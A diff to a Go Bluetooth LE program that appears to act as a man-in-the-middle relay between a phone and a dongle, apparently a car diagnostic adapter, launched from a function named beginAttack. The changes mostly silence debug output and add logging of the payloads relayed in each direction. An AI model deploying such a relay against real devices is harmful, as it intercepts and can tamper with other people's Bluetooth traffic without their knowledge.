@@ -70,12 +70,13 @@ func onPeriphDiscovered(p gatt.Peripheral, a *gatt.Advertisement, rssi int) {
 
 	// Stop scanning once we've got the peripheral we're looking for.
 	p.Device().StopScanning()
+	fmt.Println("Device found")
 	fmt.Printf("\nPeripheral ID:%s, NAME:(%s)\n", p.ID(), p.Name())
-	fmt.Println("  Local Name        =", a.LocalName)
-	fmt.Println("  TX Power Level    =", a.TxPowerLevel)
-	fmt.Println("  Manufacturer Data =", a.ManufacturerData)
-	fmt.Println("  Service Data      =", a.ServiceData)
-	fmt.Println("")
+	//fmt.Println("  Local Name        =", a.LocalName)
+	//fmt.Println("  TX Power Level    =", a.TxPowerLevel)
+	//fmt.Println("  Manufacturer Data =", a.ManufacturerData)
+	//fmt.Println("  Service Data      =", a.ServiceData)
+	//fmt.Println("")
 
 	p.Device().Connect(p)
 }
@@ -105,7 +106,7 @@ func onPeriphConnected(p gatt.Peripheral, err error) {
 		if len(s.Name()) > 0 {
 			msg += " (" + s.Name() + ")"
 		}
-		fmt.Println(msg)
+		//fmt.Println(msg)
 
 		// Discovery characteristics
 		cs, err := p.DiscoverCharacteristics(nil, s)
@@ -120,17 +121,17 @@ func onPeriphConnected(p gatt.Peripheral, err error) {
 				msg += " (" + c.Name() + ")"
 			}
 			msg += "\n    properties    " + c.Properties().String()
-			fmt.Println(msg)
+			//fmt.Println(msg)
 
 			// Read the characteristic, if possible.
-			if (c.Properties() & gatt.CharRead) != 0 {
+			/*if (c.Properties() & gatt.CharRead) != 0 {
 				b, err := p.ReadCharacteristic(c)
 				if err != nil {
 					fmt.Printf("Failed to read characteristic, err: %s\n", err)
 					continue
 				}
-				fmt.Printf("    value         %x | %q\n", b, b)
-			}
+				//fmt.Printf("    value         %x | %q\n", b, b)
+			}*/
 
 			// Discovery descriptors
 			ds, err := p.DiscoverDescriptors(nil, c)
@@ -144,20 +145,20 @@ func onPeriphConnected(p gatt.Peripheral, err error) {
 				if len(d.Name()) > 0 {
 					msg += " (" + d.Name() + ")"
 				}
-				fmt.Println(msg)
+				//fmt.Println(msg)
 
 				// Read descriptor (could fail, if it's not readable)
-				b, err := p.ReadDescriptor(d)
+				/*b, err := p.ReadDescriptor(d)
 				if err != nil {
 					fmt.Printf("Failed to read descriptor, err: %s\n", err)
 					continue
-				}
-				fmt.Printf("    value         %x | %q\n", b, b)
+				}*/
+				//fmt.Printf("    value         %x | %q\n", b, b)
 			}
 			// Write to Dongle
 			if (strings.Contains(c.Properties().String(), "write")) {
 				for isPhoneConnected {
-					fmt.Println("| Ready to write commands towards dongle ... ")
+					//fmt.Println("| Ready to write commands towards dongle ... ")
 					publicDongleData = []byte("NO DATA\r>") // In case of lost connection with Dongle
 					dongleSent = true
 					for phoneSent == false {
@@ -183,15 +184,15 @@ func onPeriphConnected(p gatt.Peripheral, err error) {
 			// Subscribe the characteristic, if possible.
 			if (c.Properties() & (gatt.CharNotify | gatt.CharIndicate)) != 0 {
 				f := func(c *gatt.Characteristic, b []byte, err error) {
-					fmt.Printf("notified: % X | %q\n", b, b)
-					// notify back to RPI -> Phone:
+					//fmt.Printf("notified: % X | %q\n", b, b)
 					var stringNotification = string(b)
 					tmpDongleData = tmpDongleData + stringNotification
 
 					switch {
 					case strings.Contains(stringNotification, ">"):
 						publicDongleData = []byte(tmpDongleData)
-						fmt.Println(">> Dongle sent data back")
+						fmt.Println("<< \"" + tmpDongleData + "\"")
+						fmt.Println("<< Dongle sent data back")
 						dongleSent = true
 						tmpDongleData = ""
 					}
@@ -215,7 +216,7 @@ func onPeriphDisconnected(p gatt.Peripheral, err error) {
 	dongleSent = false
 	phoneSent = false
 	if autoConnect {
-		fmt.Println("Dongle autoconnecting ON")
+		fmt.Println("Dongle trying to reconnect ...")
 		connectToDongle()
 	} else {
 	close(done)
@@ -237,14 +238,14 @@ func writeService() *gatt.Service {
 	s.AddCharacteristic(gatt.MustParseUUID("0000fff2-0000-1000-8000-00805f9b34fb")).HandleWriteFunc(
 		func(r gatt.Request, data []byte) (status byte) {
 			isPhoneConnected = true
-			fmt.Println("I WAS CALLED...")
-			fmt.Println("| Ready to handle data from phone")
+			//fmt.Println("| Ready to handle data from phone")
 			for isDongleConnected == false {
 				// Do not continue until Dongle connection has been established
 			}
 			// Update data that will be sent to Dongle:
 			publicPhoneData = data
 			phoneSent = true
+			fmt.Println(">> \"" + string(data) + "\"")
 			fmt.Println(">> Phone sent data towards dongle")
 			for dongleSent == false {
 				// Awaiting data from Dongle ...
@@ -328,8 +329,6 @@ func connectToDongle() {
 	fmt.Println("Done")
 }
 
-
-
 func beginAttack() {
 	gattDev, err := gatt.NewDevice(gatt.LnxMaxConnections(2))
 	if err != nil {
@@ -349,5 +348,3 @@ func main() {
 	dongleSent = false
 	beginAttack()
 }
-
-
